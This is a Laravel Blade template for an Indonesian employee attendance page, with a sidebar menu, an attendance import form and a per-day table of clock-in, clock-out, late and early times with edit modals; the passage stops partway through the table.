<!DOCTYPE html>
<html lang="en">
<head>
    <!-- CSS -->

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Data Karyawan</title>
    <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
    <link rel="stylesheet" href="/assets/css/presensi.css" type="text/css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    <!-- Toastr untuk notifikasi -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

<div class="be-wrapper">
    <div class="be-wrapper be-fixed-sidebar">

        <!--  Sidebar Brand Logo -->

        <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

            <!--  Sidebar Brand Logo End -->

            <!--  Sidebar Start -->

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
                <div class="left-sidebar-spacer">
                    <div class="left-sidebar-scroll">
                        <div class="left-sidebar-content">

                            <!--  Sidebar Poto, Username, Edit Profil -->

                            <div class="profil">
                                <div class="circular--portrait">
                                    <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                                    <div id="username">
                                        <a href="/profil" class="simple_text"><h1 class="username">{{ Auth::user()->nama_karyawan }}</h1></a>
                                    </div>
                                    <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                                    <!-- <button class="btn btn-space btn-default active">Default</button> -->
                                </div>
                            </div>

                            <!--  Sidebar Menu-->

                            <ul class="sidebar-elements">
                                <li class="divider">Menu
                                    <hr class="Menu">
                                </li>

                                <li class="active"><a href="/home">
                                        <i class="icon fas fa-home"></i>
                                        <span>Beranda</span></a>
                                </li>

                                <li class="active">
                                    <a class="" href="/datakaryawan">
                                        <i class="icon far fa-address-book"></i>
                                        <span>Data Karyawan</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/presensi">
                                        <i class="icon fas fa-calendar-alt"></i>
                                        <span>Presensi</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/penggajian">
                                        <i class="icon fas fa-money-check-alt"></i>
                                        <span>Penggajian</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/dsivisi">
                                        <img src="/assets/img/icons8-organization-chart-people-24.png">
                                        <span>&nbsp&nbspDivisi</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/persetujuan_izin">
                                        <i class="icon far fa-calendar-check"></i>
                                        <span>Persetujuan Izin</span>
                                    </a>
                                </li>

                                <li class="divider">Personal
                                    <hr class="Menu">
                                </li>

                                <li class="active">
                                    <a class=" " href="/gaji">
                                        <i class="icon far fa-money-bill-alt"></i>
                                        <span>Gaji</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/kontak_karyawan">
                                        <i class="icon far fa-id-card"></i>
                                        <span>Kontak Karyawan</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class=" " href="/form_izin">
                                        <i class="icon fab fa-wpforms"></i>
                                        <span>Form Izin</span>
                                    </a>
                                </li>

                                <li class="active">
                                    <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                    </a>

                                    <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                    </form>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!--  Sidebar End -->

    <!-- Konten -->
    <div class="be-content">
        <div class="page-head">
            <h2 class="page-head-title">Presensi</h2>
        </div>
        <div class="main-content container-fluid">
            <div class="panel panel-default panel-table">
                <div class="panel-body">

                    <div class="panel-heading">Tabel
                        <div style="display: table-row" class="tools">
                            <div align="center">
                                <div  style="display: table-cell" class="tools">
                                    <button style="height: 40px;"  type="button" class="btn btn-space btn-danger">Unduh Laporan</button>
                                </div>
                                <div  style="display: table-cell" class="tools" >
                                    <button style="height: 40px;" data-toggle="modal" data-target="#importfile" type="button" class="btn btn-space btn-warning">Import Presensi</button>
                                    <!-- Modals untuk Hapus -->

                                    <div id="importfile" tabindex="-1" role="dialog" class="modal fade">
                                        <div class="modal-dialog">
                                            <div class="modal-content">
                                                <div class="modal-header">

                                                </div>
                                                <div class="modal-body">
                                                    <div class="text-center">
                                                        <div class="text-primary"><h3>Import Presensi</h3></div>
                                                        <h3>Silahkan Pilih File Presensi yang Ingin Anda Upload!</h3>
                                                        <form id="form_submit_edit" name="submit1" action="/presensi/import_file" method="POST" enctype="multipart/form-data">
                                                            @csrf
                                                            <div class="modal-body">
                                                                <div class="form-group">
                                                                    <label class="control-label" for=""></label>
                                                                    <input type="file" class="form-control" name="import_presensi" id="upload" required="">
                                                                </div>
                                                                <h4>Silahkan masukkan rentang tanggal!</h4>
                                                                <div style="margin-right: 15%; ">
                                                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                                                        <input style=" height: 40px" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date">
                                                                    </div>
                                                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                                                        <label style="margin-top: 12px">S.d</label>
                                                                    </div>
                                                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                                                        <input style=" height: 40px" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="xs-mt-50">
                                                                <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                                                <button type="reset"  class="btn btn-space btn-warning">Reset</button>
                                                                <button type="submit" class="btn btn-space btn-primary">Import</button>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                                <div class="modal-footer"></div>
                                            </div>
                                        </div>
                                    </div>
                                    <!--Akhir dari Modals Hapus -->
                                </div>
                                <form style="float: right;" id="form_submit_tampilkan_presensi" name="submit2" action="/presensi/tampilkan_presensi" method="POST">
                                    @csrf
                                    <div  style="display: table-cell" class="tools">
                                        <button style="height: 40px;" type="submit" class="btn btn-space btn-primary">Tampilkan Presensi</button>
                                    </div>
                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                        <input style=" height: 40px" name="sampai_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                                    </div>
                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                        <label style="margin-top: 12px">S.d</label>
                                    </div>
                                    <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                                        <input style=" height: 40px" name="dari_tanggal" class="form-control input-sm datetimepicker" type="date" required="">
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>


                <div class="panel-body">


                    <div class="table-responsive noSwipe">
                        <table id="table1" class="table table-striped table-hover table-fw-widget">
                            <thead>
                            <tr>
                                <th rowspan="2">NIK<br><br><br></th>
                                <th rowspan="2">ID_SJ<br><br><br></th>
                                <th rowspan="2">Nama<br><br><br></th>
                                <th rowspan="2">Divisi<br><br><br></th>
                                <th rowspan="2">Ket.<br><br><br></th>
                                <th colspan="31" style="text-align: center; vertical-align: center;">Tanggal</th>
                                <th rowspan="2">Total<br><br><br></th>
                                <th rowspan="2">J.Keterlambatan<br><br><br></th>
                                <th rowspan="2">Transport<br><br><br></th>
                                <th rowspan="2">Tambahan.DLL<br><br><br></th>
                                <th rowspan="2">T.Transport<br><br><br></th>
                                <th rowspan="2">Keterangan<br><br><br></th>
                                <th rowspan="2">Aksi<br><br><br></th>
                            </tr>
                            <tr>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp21&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp22&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp23&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp24&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp25&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp26&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp27&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp28&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp29&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp30&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp31&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp1&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp2&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp3&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp4&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp5&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp6&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp7&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp8&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp9&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp10&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp11&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp12&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp13&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp14&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp15&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp16&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp17&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp18&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp19&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                                <th>&nbsp&nbsp&nbsp&nbsp&nbsp20&nbsp&nbsp&nbsp&nbsp&nbsp</th>
                            </tr>
                            </thead>
                            <tbody>
                            @if(is_null($data_karyawan) || is_null($data_presensi))
                            @else
                                @php
                                    $data_karyawan = $data_karyawan->all();
                                    $data_presensi = $data_presensi->all();
                                @endphp
                            @endif

                            @foreach( (array) $data_karyawan as $data)
                                <tr class="odd gradeA">
                                    <td>{{$data->nik}}&nbsp&nbsp</td>
                                    <td>{{$data->id_sidik_jari}}&nbsp&nbsp</td>
                                    <td>{{$data->nama_karyawan}}&nbsp&nbsp</td>
                                    <td>{{$data->divisi}}&nbsp&nbsp</td>
                                    <td>
                                        <div class="column">
                                            <div class="row" style="text-align: left; margin-top: 7px;">Clock In&nbsp&nbsp&nbsp&nbsp:&nbsp&nbsp</div>
                                            <div class="row" style="text-align: left; margin-top: 7px;">Clock Out&nbsp:&nbsp&nbsp</div>
                                            <div class="row" style="text-align: left; margin-top: 7px;">Late In&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp:&nbsp&nbsp</div>
                                            <div class="row" style="text-align: left; margin-top: 7px;">Early Out&nbsp&nbsp:&nbsp&nbsp</div>
                                        </div>
                                    </td>
                                    <td>
                                        <div class="column" style="margin-top: 7px;">
                                            @foreach( (array) $data_presensi as $presensi)
                                                @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                    @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 21 )
                                                      <div class="row" style="text-align: center;">
                                                        <a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="{{$presensi->info_clock_in}}">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp
                                                        <button type="button" data-toggle="modal" data-target="#modal_clock_in-{{$presensi->id_presensi}}" >+</button>
                                                      </div>
                                                      <div class="row" style="text-align: center;">
                                                        <a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="{{$presensi->info_clock_out}}">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp
                                                        <button type="button" data-toggle="modal" data-target="#modal_clock_out-{{$presensi->id_presensi}}">+</button>
                                                      </div>
                                                      <div class="row" style="text-align: center;">
                                                        <a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="{{$presensi->info_late_presensi}}">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
                                                        <button type="button" data-toggle="modal" data-target="#modal_late_presensi-{{$presensi->id_presensi}}">+</button>
                                                      </div>
                                                      <div class="row" style="text-align: center;">
                                                        <a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="{{$presensi->info_early_presensi}}">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
                                                        <button type="button" data-toggle="modal" data-target="#modal_early_presensi-{{$presensi->id_presensi}}">+</button>
                                                      </div>
                                                      
                                                        <!-- The Modal Clock IN-->
                                                      
                                                        <div class="modal fade" id="modal_clock_in-{{$presensi->id_presensi}}">
                                                          <div class="modal-dialog modal-sm">
                                                            <div class="modal-content">
                                                            
                                                              <!-- Modal Header -->
                                                              <div class="modal-header">
                                                                <h4 class="modal-title">Edit Clock In</h4>
                                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                                              </div>

                                                              <form action="/presensi/{{$presensi->id_presensi}}/update/clock_in" method="POST">
                                                              {{ csrf_field()}} 
                                                              <!-- Modal body -->
                                                              <div class="modal-body">
                                                                <div class="form-group">
                                                                  <label for="usr">Jam Clock In:</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->jam_clock_in}}" name="jam_clock_in">
                                                                </div><br><br>
                                                                <div class="form-group">
                                                                  <label for="pwd">Info Clock In</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->info_clock_in}}" name="info_clock_in">
                                                                </div><br>
                                                              </div>
                                                              
                                                                <!-- Modal footer -->
                                                              <div class="modal-footer">
                                                                  <button type="submit" class="btn btn-primary">Submit</button>
                                                                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                              </div>
                                                              </form>
                                                              
                                                            </div>
                                                          </div>
                                                        </div>
                                                     

                                                        <!-- The Modal Clock Out-->
                                                        <div class="modal fade" id="modal_clock_out-{{$presensi->id_presensi}}">
                                                          <div class="modal-dialog modal-sm">
                                                            <div class="modal-content">
                                                            
                                                              <!-- Modal Header -->
                                                              <div class="modal-header">
                                                                <h4 class="modal-title">Edit Clock Out</h4>
                                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                                              </div>
                                                              
                                                              <!-- Modal body -->
                                                              <div class="modal-body">
                                                                <div class="form-group">
                                                                  <label for="usr">Jam Clock Out:</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->jam_clock_out}}" name="jam_clock_out">
                                                                </div><br><br>
                                                                <div class="form-group">
                                                                  <label for="pwd">Info Clock Out</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->info_clock_out}}" name="info_clock_out">
                                                                </div><br>
                                                                
                                                              </div>
                                                              
                                                              <!-- Modal footer -->
                                                              <div class="modal-footer">
                                                                <button type="submit" class="btn btn-primary">Submit</button>
                                                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                              </div>
                                                              
                                                            </div>
                                                          </div>
                                                        </div>

                                                        <!-- The Modal Late Presensi -->
                                                        <div class="modal fade" id="modal_late_presensi-{{$presensi->id_presensi}}">
                                                          <div class="modal-dialog modal-sm">
                                                            <div class="modal-content">
                                                            
                                                              <!-- Modal Header -->
                                                              <div class="modal-header">
                                                                <h4 class="modal-title">Edit Late </h4>
                                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                                              </div>
                                                              
                                                              <!-- Modal body -->
                                                              <div class="modal-body">
                                                                <div class="form-group">
                                                                  <label for="usr">Late</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->late_presensi}}" name="late_presensi">
                                                                </div><br><br>
                                                                <div class="form-group">
                                                                  <label for="pwd">Info Late</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->info_late_presensi}}" name="info_late_presensi">
                                                                </div><br>
                                                                
                                                              </div>
                                                              
                                                              <!-- Modal footer -->
                                                              <div class="modal-footer">
                                                                <button type="submit" class="btn btn-primary">Submit</button>
                                                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                              </div>
                                                              
                                                            </div>
                                                          </div>
                                                        </div>

                                                        <!-- The Modal Late Presensi -->
                                                        <div class="modal fade" id="modal_early_presensi-{{$presensi->id_presensi}}">
                                                          <div class="modal-dialog modal-sm">
                                                            <div class="modal-content">
                                                            
                                                              <!-- Modal Header -->
                                                              <div class="modal-header">
                                                                <h4 class="modal-title">Edit Early </h4>
                                                                <button type="button" class="close" data-dismiss="modal">&times;</button>
                                                              </div>
                                                              
                                                              <!-- Modal body -->
                                                              <div class="modal-body">
                                                                <div class="form-group">
                                                                  <label for="usr">Early</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->early_presensi}}" name="early_presensi">
                                                                </div><br><br>
                                                                <div class="form-group">
                                                                  <label for="pwd">Info Early</label><br>
                                                                  <input type="text" class="form-control" value="{{$presensi->info_early_presensi}}" name="info_early_presensi">
                                                                </div><br>
                                                                
                                                              </div>
                                                              
                                                              <!-- Modal footer -->
                                                              <div class="modal-footer">
                                                                <button type="submit" class="btn btn-primary">Submit</button>
                                                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                                              </div>
                                                              
                                                            </div>
                                                          </div>
                                                        </div>


                                                    @endif
                                                @endif
                                            @endforeach
                                        </div>
                                    </td>
                                    <td>
                                      <div class="column" style="margin-top: 7px;">
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 22 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                      </div>
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 23 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 24 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 25 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 26 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 27 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 28 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->late_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp&nbsp&nbsp{{number_format($presensi->early_presensi,2)}}</a>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button>+</button></div>
                                                @endif
                                            @endif
                                        @endforeach
                                    </td>
                                    <td>
                                        @foreach( (array) $data_presensi as $presensi)
                                            @if($data->id_sidik_jari == $presensi->id_sidik_jari)
                                                @if(DateTime::createFromFormat('Y-m-d',$presensi->tanggal_presensi)->format('d') == 29 )
                                                    <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_in}}</a>&nbsp<button>+</button></div>
                                                      <div class="row" style="text-align: center;"><a href="#" data-toggle="popover" data-placement="top" title="Info" data-content="Some content inside the popover">&nbsp{{$presensi->jam_clock_out}}</a>&nbsp<button>+</button></div>
